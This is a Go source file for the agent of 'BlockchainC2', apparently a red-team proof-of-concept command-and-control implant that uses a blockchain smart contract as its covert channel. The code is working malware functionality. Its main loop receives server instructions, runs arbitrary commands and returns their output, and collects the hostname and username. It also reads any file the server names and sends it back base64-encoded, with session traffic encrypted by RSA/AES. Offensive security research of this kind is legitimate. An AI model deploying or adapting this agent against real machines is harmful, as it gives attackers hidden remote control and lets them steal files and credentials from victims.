package main

import (
	"blockchainc2/internal/pkg/BlockchainC2"
	"blockchainc2/internal/pkg/Utils"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"os/user"
)

// Config contains execution options for our agent
type Config struct {
	Key             string `json:"Key"`
	Endpoint        string `json:"Endpoint"`
	ContractAddress string `json:"ContractAddress"`
	GasPrice        int    `json:"GasPrice"`
}

// handleExecuteCommand is responsible for handling provided command execution from the server
func handleExecuteCommand(bc *BlockchainC2.BlockchainClient, data string) {

	fmt.Println("[*] Executing command: ", data)

	// Parse the provided command line for execution
	command, err := Utils.ParseCommandLine(data)
	if err != nil {
		fmt.Println("[!] Error parsing provided command line: ", err)
		return
	}

	// Pass this for execution and retrieve the output
	output, err := exec.Command(command[0], command[1:]...).Output()
	if err != nil {
		fmt.Println("[!] Command Execution Failed: ", err)
		return
	}
	fmt.Println("[*] Execution Output: ", string(output))

	// Send output back to the server
	if err := bc.SendToServer(string(output), BlockchainC2.AgentToServerData, true); err != nil {
		fmt.Println("[!] Error sending data to server: ", err)
		return
	}
}

// handleCryptoHandshake is responsible for taking the provided RSA private key from the server
// and encrypting a generated AES session key, sending this to the server for all further traffic
// to be encrypted
func handleCryptoHandshake(bc *BlockchainC2.BlockchainClient, key string) {

	// Generate a new session key
	sessionKey := Utils.GenerateSymmetricKeys()

	// Assign this as our session key
	bc.SetSessionKey(sessionKey)

	// Ingest the RSA key to pass our session key
	publicKey := Utils.AsymmetricKeyFromString([]byte(key))

	// Encrypt our key
	encryptedKey, _ := Utils.AsymmetricEncrypt(sessionKey, publicKey)

	// Provide this key to the server
	if err := bc.SendToServer(base64.URLEncoding.EncodeToString(encryptedKey), BlockchainC2.AgentToServerCryptoHandshake, false); err != nil {
		fmt.Println("[!] Error sending encrypted session key to server: ", err)
		return
	}
}

// handleAgentInfoRequest sends information from the running state of the agent including
// the hostname and executing username for display in the UI on the server
func handleAgentInfoRequest(bc *BlockchainC2.BlockchainClient, data string) {

	// Retrieve current username from the OS
	currentUser, err := user.Current()
	if err != nil {
		fmt.Println("[!] Error retrieving current username: ", err)
		currentUser = &user.User{Username: "Unknown"}
	}

	// Retrieve the current hostname from the OS
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("[!] Error retrieving current hostname: ", err)
		hostname = "Unknown"
	}

	// Send our agent information back to the server
	if err := bc.SendToServer(Utils.ToJSONString(BlockchainC2.AgentInfoMsg{Hostname: hostname, Username: currentUser.Username}), BlockchainC2.AgentToServerInfo, true); err != nil {
		fmt.Println("[!] Error sending agent information to server: ", err)
		return
	}
}

// handleFileDownload handles a file download request from the server, sending the file contents
// over the blockchain
func handleFileDownload(bc *BlockchainC2.BlockchainClient, filepath string) {

	// Read the target file
	fileContents, err := ioutil.ReadFile(filepath)
	if err != nil {
		fmt.Println("[!] Error During File Download: ", err)
		return
	}

	// Send the file contents back to the server
	if err := bc.SendToServer(base64.URLEncoding.EncodeToString(fileContents), BlockchainC2.AgentToServerFileDownload, true); err != nil {
		fmt.Println("[!] Error sending file contents to server: ", err)
		return
	}
}

// printIntro displays our intro on agent startup
func printIntro() {
	fmt.Printf(`
	/$$$$$$$   /$$$$$$   /$$$$$$ 
	| $$__  $$ /$$__  $$ /$$__  $$
	| $$  \ $$| $$  \__/|__/  \ $$
	| $$$$$$$ | $$        /$$$$$$/
	| $$__  $$| $$       /$$____/ 
	| $$  \ $$| $$    $$| $$      
	| $$$$$$$/|  $$$$$$/| $$$$$$$$
	|_______/  \______/ |________/
	
	 BlockchainC2 Agent
	 POC by @_xpn_
								  
								  
`)
}

func main() {

	var config Config

	// Display our intro
	printIntro()

	// Parse the provided arguments
	configPath := flag.String("config", "./config.json", "The path to config.json")
	cryptPassword := flag.String("pass", "", "Password to decrypt key provided in config.json")
	flag.Parse()

	// Ensure that a password has been provided to decrypt the keychain
	if *cryptPassword == "" {
		flag.PrintDefaults()
		return
	}

	// Read the JSON config file containing our options
	configContents, err := ioutil.ReadFile(*configPath)
	if err != nil {
		fmt.Println("[!] Error Reading Config: ", err)
		return
	}

	// Deserialize the config contents
	if err := json.Unmarshal(configContents, &config); err != nil {
		fmt.Println("[!] Error Parsing JSON: ", err)
		return
	}

	Key := config.Key
	Endpoint := config.Endpoint
	ContractAddress := config.ContractAddress
	GasPrice := config.GasPrice

	// Generate our AgentID
	AgentID := BlockchainC2.RandStringBytes(10)
	fmt.Println("[*] Agent ID generated: ", AgentID)

	// Create our client to communicate with the blockchain
	fmt.Println("[*] Creating connection to blockchain via JSON-RPC")
	client, err := BlockchainC2.CreateBlockchainClient(Key, *cryptPassword, Endpoint, ContractAddress, AgentID, int64(GasPrice))
	if err != nil {
		fmt.Println("[!] Error occurred creating connection to blockchain: ", err)
		return
	}
	fmt.Println("[*] Connection created successfully")

	// Create our session key
	sessionKey := Utils.GenerateSymmetricKeys()
	client.SetSessionKey(sessionKey)

	// Let the server know we are online
	if err := client.SendToServer("", BlockchainC2.AgentToServerJoin, false); err != nil {
		fmt.Println("[!] Error sending transaction: ", err)
		return
	}

	// Our C2 loop
	for client.Running {

		// Receive data from the blockchain sent by the server
		msgID, data := client.RecvFromServer()

		switch msgID {

		// Receive Crypto
		case BlockchainC2.ServerToAgentCryptoHandshake:
			fmt.Println("[*] Crypto handshake received")
			handleCryptoHandshake(client, data)

		// Execute Command
		case BlockchainC2.ServerToAgentExecuteCommand:
			fmt.Println("[*] Request to execute command")
			handleExecuteCommand(client, data)

		// Adjust sleep time
		//case BlockchainC2.ServerToAgentSleep:
		//	fmt.Printf("[*] Updating Sleep to %s seconds\n", data)
		//	client.Sleep = 10000

		// Exit client
		case BlockchainC2.ServerToAgentExit:
			fmt.Println("[*] Instructed to exit by server")
			client.Running = false

		// Send information about our running environment
		case BlockchainC2.ServerToAgentInfo:
			fmt.Println("[*] Request for Agent information")
			handleAgentInfoRequest(client, data)

		// Download a file by sending it to the server
		case BlockchainC2.ServerToAgentFileDownload:
			fmt.Printf("[*] Request to download %s\n", data)
			handleFileDownload(client, data)

		// If nothing, we just ping back to update our "last seen"
		default:
			fmt.Println("[*] Unknown command received, sending ping back to server")
			if err := client.SendToServer("", BlockchainC2.AgentToServerPing, true); err != nil {
				fmt.Println("Error sending data to server: ", err)
			}
		}
	}
}
